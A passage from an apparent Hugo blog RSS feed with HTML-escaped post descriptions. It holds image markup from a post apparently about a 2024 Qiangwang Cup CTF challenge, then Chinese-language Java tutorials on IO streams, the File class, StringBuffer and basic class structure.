srcset=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130105942945_hu16294083744582567603.png 300w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130105942945_hu2879443338579072657.png 500w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130105942945_hu4709346995297581058.png 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;        alt=&#34;image-20241130105942945&#34;&#xA;        &#xA;        loading=&#34;lazy&#34;&#xA;        width=&#34;1826&#34;&#xA;        height=&#34;96&#34;&#xA;      /&gt;&#xA;    &lt;/picture&gt;&#xA;  &#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;&#xA;    &#xA;    &#xA;    &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;&#xA;&#xA;    &lt;picture&gt;&#xA;      &lt;source&#xA;        type=&#34;image/webp&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130111843833_hu13144594974813083868.webp 300w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130111843833_hu7226058592492524996.webp 500w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130111843833_hu950800830555805390.webp 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;      /&gt;&#xA;      &lt;img&#xA;        src=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130111843833.png&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130111843833_hu12742039100656728641.png 300w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130111843833_hu17576869531687489967.png 500w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130111843833_hu2283354835065216942.png 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;        alt=&#34;image-20241130111843833&#34;&#xA;        &#xA;        loading=&#34;lazy&#34;&#xA;        width=&#34;1822&#34;&#xA;        height=&#34;800&#34;&#xA;      /&gt;&#xA;    &lt;/picture&gt;&#xA;  &#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Io Programming</title>
      <link>http://localhost:1313/blog/io_programming/</link>
      <pubDate>Thu, 21 Nov 2024 21:35:04 +0800</pubDate>
      <guid>http://localhost:1313/blog/io_programming/</guid>
      <description>&lt;h3 id=&#34;输入流和输出流&#34;&gt;输入流和输出流&lt;a href=&#34;#%e8%be%93%e5%85%a5%e6%b5%81%e5%92%8c%e8%be%93%e5%87%ba%e6%b5%81&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h3&gt;&#xA;&lt;p&gt;&lt;strong&gt;输入流（InputStream）&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;输入流用于从数据源读取数据。常见的数据源包括文件、网络连接、内存中的字节数组等。&lt;code&gt;InputStream&lt;/code&gt; 是所有字节输入流的基类，它定义了一些基本的方法，具体的子类实现了这些方法以适应不同的数据源。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;输出流（OutputStream）&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;输出流用于将数据写入目标位置。常见的目标位置包括文件、网络连接、内存中的字节数组等。&lt;code&gt;OutputStream&lt;/code&gt; 是所有字节输出流的基类，它定义了一些基本的方法，具体的子类实现了这些方法以适应不同的目标位置。&lt;/p&gt;&#xA;&lt;h3 id=&#34;file文件操作&#34;&gt;File文件操作&lt;a href=&#34;#file%e6%96%87%e4%bb%b6%e6%93%8d%e4%bd%9c&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h3&gt;&#xA;&lt;h3 id=&#34;初识&#34;&gt;初识&lt;a href=&#34;#%e5%88%9d%e8%af%86&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h3&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;java.io.File类是一个与文件本身操作有关的类，此类可以实现文件创建、删除、重命名、取得文件大小、修改日期等常见系统文件操作&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;如果要使用File类则必须提供完整的文件操作路径，对于文件路径的设置可以通过File类的构造方法完成，当获取了正确的文件路径后就可以进行文件创建于删除操作、File类文件基本操作方法&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;No.&lt;/th&gt;&#xA;          &lt;th&gt;方法&lt;/th&gt;&#xA;          &lt;th&gt;类型&lt;/th&gt;&#xA;          &lt;th&gt;描述&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;1&lt;/td&gt;&#xA;          &lt;td&gt;public File(String pathname)&lt;/td&gt;&#xA;          &lt;td&gt;构造&lt;/td&gt;&#xA;          &lt;td&gt;给定一个要操作文件的完整路径&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;2&lt;/td&gt;&#xA;          &lt;td&gt;public File(File parent,String child)&lt;/td&gt;&#xA;          &lt;td&gt;构造&lt;/td&gt;&#xA;          &lt;td&gt;给定要操作文件的父路径和子文件名称&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;3&lt;/td&gt;&#xA;          &lt;td&gt;public boolean createNewFile() throws IOException&lt;/td&gt;&#xA;          &lt;td&gt;普通&lt;/td&gt;&#xA;          &lt;td&gt;创建文件&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;4&lt;/td&gt;&#xA;          &lt;td&gt;public boolean delete()&lt;/td&gt;&#xA;          &lt;td&gt;普通&lt;/td&gt;&#xA;          &lt;td&gt;删除文件&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;5&lt;/td&gt;&#xA;          &lt;td&gt;public boolean exists()&lt;/td&gt;&#xA;          &lt;td&gt;普通&lt;/td&gt;&#xA;          &lt;td&gt;判断给定路径是否存在&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;示例&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.File;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JavaIODemo&lt;/span&gt;{&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args) &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; Exception{&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;File file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; File(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D:\\1.txt&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;//文件路径: &amp;#34;\\&amp;#34;转义为&amp;#34;\&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(file.&lt;span style=&#34;color:#a6e22e&#34;&gt;exists&lt;/span&gt;()){&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&#x9;file.&lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&#x9;System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(file.&lt;span style=&#34;color:#a6e22e&#34;&gt;createNewFile&lt;/span&gt;());&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;分隔符&#34;&gt;分隔符&lt;a href=&#34;#%e5%88%86%e9%9a%94%e7%ac%a6&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h3&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;windows中是&amp;quot;\&amp;quot; 而在UNIX或类UNIX操作系统中路径分隔符是&amp;quot;/&amp;quot;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Java常用类库</title>
      <link>http://localhost:1313/blog/java%E5%B8%B8%E7%94%A8%E7%B1%BB%E5%BA%93/</link>
      <pubDate>Wed, 20 Nov 2024 21:39:44 +0800</pubDate>
      <guid>http://localhost:1313/blog/java%E5%B8%B8%E7%94%A8%E7%B1%BB%E5%BA%93/</guid>
      <description>&lt;h2 id=&#34;stringbuffer类&#34;&gt;StringBuffer类&lt;a href=&#34;#stringbuffer%e7%b1%bb&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h2&gt;&#xA;&lt;h4 id=&#34;string和stringbuffer的区别&#34;&gt;String和StringBuffer的区别&lt;a href=&#34;#string%e5%92%8cstringbuffer%e7%9a%84%e5%8c%ba%e5%88%ab&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h4&gt;&#xA;&lt;p&gt;&lt;strong&gt;String&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;不可变性&lt;/strong&gt;：&lt;code&gt;String&lt;/code&gt; 类是不可变的，这意味着一旦创建了一个 &lt;code&gt;String&lt;/code&gt; 对象，其值就不能改变。每次对 &lt;code&gt;String&lt;/code&gt; 进行修改（如连接、替换等操作）都会产生新的 &lt;code&gt;String&lt;/code&gt; 对象，原来的对象不会被改变。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;线程安全性&lt;/strong&gt;：由于 &lt;code&gt;String&lt;/code&gt; 的不可变性，它是线程安全的，可以被多个线程共享而无需担心数据一致性的问题。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;性能&lt;/strong&gt;：因为每次修改都会创建新的对象，所以在频繁进行字符串操作时，&lt;code&gt;String&lt;/code&gt; 的效率较低。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;StringBuffer&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;可变性&lt;/strong&gt;：&lt;code&gt;StringBuffer&lt;/code&gt; 是一个可变的字符序列，可以被多次修改而不创建新的对象。这意味着如果需要对字符串进行大量的修改操作，使用 &lt;code&gt;StringBuffer&lt;/code&gt; 比使用 &lt;code&gt;String&lt;/code&gt; 更加高效。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;线程安全性&lt;/strong&gt;：&lt;code&gt;StringBuffer&lt;/code&gt; 是线程安全的。它的方法都是同步的（即加了 &lt;code&gt;synchronized&lt;/code&gt; 关键字），这使得 &lt;code&gt;StringBuffer&lt;/code&gt; 可以在多线程环境中安全地使用，但是也导致了它的性能相比非线程安全的 &lt;code&gt;StringBuilder&lt;/code&gt; 要差一些。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;性能&lt;/strong&gt;：当需要在一个单线程环境下进行大量字符串操作时，&lt;code&gt;StringBuffer&lt;/code&gt; 仍然不是最优选择，因为它的线程安全特性会带来额外的开销。在这种情况下，应该考虑使用 &lt;code&gt;StringBuilder&lt;/code&gt;。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;使用场景&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;使用 &lt;code&gt;String&lt;/code&gt;&lt;/strong&gt;：当你不需要修改字符串内容时，或者修改次数非常少的时候，使用 &lt;code&gt;String&lt;/code&gt; 是合适的。此外，&lt;code&gt;String&lt;/code&gt; 的不可变性和线程安全性使其成为多线程环境中的首选。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;使用 &lt;code&gt;StringBuffer&lt;/code&gt;&lt;/strong&gt;：如果你的应用程序需要在多线程环境中频繁地修改字符串，那么 &lt;code&gt;StringBuffer&lt;/code&gt; 是一个很好的选择，因为它提供了线程安全的操作。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;使用 &lt;code&gt;StringBuilder&lt;/code&gt;&lt;/strong&gt;：对于单线程环境下的频繁字符串操作，推荐使用 &lt;code&gt;StringBuilder&lt;/code&gt;，因为它比 &lt;code&gt;StringBuffer&lt;/code&gt; 性能更高，同时又保持了可变性的优点。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;stringbuffer介绍&#34;&gt;StringBuffer介绍&lt;a href=&#34;#stringbuffer%e4%bb%8b%e7%bb%8d&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h4&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;String类自身有一个最大的缺陷：内容一旦声明则不可改变，JDK为了方便用户修改字符串内容提供了StringBuffer类&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;StringBuffer类不像String类那样可以直接通过声明字符串常量方式进行实例化，而是必须像普通类对象使用一样，首先通过构造方法进行对象实例化，而后才可以调用方法进行处理。&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;No.&lt;/th&gt;&#xA;          &lt;th&gt;方法&lt;/th&gt;&#xA;          &lt;th&gt;类型&lt;/th&gt;&#xA;          &lt;th&gt;描述&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;1&lt;/td&gt;&#xA;          &lt;td&gt;public StringBuffer()&lt;/td&gt;&#xA;          &lt;td&gt;构造&lt;/td&gt;&#xA;          &lt;td&gt;创建一个空的StringBuffer对象&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;2&lt;/td&gt;&#xA;          &lt;td&gt;public StringBuffer(String str)&lt;/td&gt;&#xA;          &lt;td&gt;构造&lt;/td&gt;&#xA;          &lt;td&gt;将接受到的String内容变为StringBuffer内容&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;3&lt;/td&gt;&#xA;          &lt;td&gt;public StringBuffer append(数据类型 变量)&lt;/td&gt;&#xA;          &lt;td&gt;普通&lt;/td&gt;&#xA;          &lt;td&gt;内容连接，等价于String中：”+”操作&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;4&lt;/td&gt;&#xA;          &lt;td&gt;public StringBuffer insert(int offset,数据类型 变量)&lt;/td&gt;&#xA;          &lt;td&gt;普通&lt;/td&gt;&#xA;          &lt;td&gt;在指定索引位置处插入数据&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;5&lt;/td&gt;&#xA;          &lt;td&gt;public StringBuffer delete(int start,int end)&lt;/td&gt;&#xA;          &lt;td&gt;普通&lt;/td&gt;&#xA;          &lt;td&gt;删除指定索引范围之内的数据&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;6&lt;/td&gt;&#xA;          &lt;td&gt;public StringBuffer reverse()&lt;/td&gt;&#xA;          &lt;td&gt;普通&lt;/td&gt;&#xA;          &lt;td&gt;内容反转&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;示例&lt;/p&gt;</description>
    </item>
    <item>
      <title>Java Base</title>
      <link>http://localhost:1313/blog/java_base/</link>
      <pubDate>Sun, 17 Nov 2024 15:19:37 +0800</pubDate>
      <guid>http://localhost:1313/blog/java_base/</guid>
      <description>&lt;h2 id=&#34;java文件结构快速了解&#34;&gt;java文件结构快速了解&lt;a href=&#34;#java%e6%96%87%e4%bb%b6%e7%bb%93%e6%9e%84%e5%bf%ab%e9%80%9f%e4%ba%86%e8%a7%a3&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h2&gt;&#xA;&lt;h3 id=&#34;java-文件的基本结构&#34;&gt;Java 文件的基本结构&lt;a href=&#34;#java-%e6%96%87%e4%bb%b6%e7%9a%84%e5%9f%ba%e6%9c%ac%e7%bb%93%e6%9e%84&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h3&gt;&#xA;&lt;p&gt;一个简单的Java文件通常包含以下几个部分：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;包声明&lt;/strong&gt;：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;每个Java源文件都属于某个包。包的作用类似于文件夹，用于组织和分类相关的类。&lt;/li&gt;&#xA;&lt;li&gt;示例：&lt;code&gt;package com.example;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;导入语句&lt;/strong&gt;：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;导入语句用于引入其他包中的类或接口，这样可以在当前文件中直接使用这些类或接口。&lt;/li&gt;&#xA;&lt;li&gt;示例：&lt;code&gt;import java.util.ArrayList;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;类声明&lt;/strong&gt;：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;类是Java程序的基本构建块。每个类定义了一组属性（变量）和方法（函数）。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;示例：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HelloWorld&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 类体&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;构造方法&lt;/strong&gt;：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;构造方法是一种特殊的方法，用于创建类的新实例时初始化对象。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;示例：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HelloWorld&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 初始化代码&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;属性（成员变量）&lt;/strong&gt;：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;属性是类中存储数据的变量。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;示例：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; String name;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;方法&lt;/strong&gt;：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;方法是执行特定任务的代码块。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;示例：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sayHello&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello, World!&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 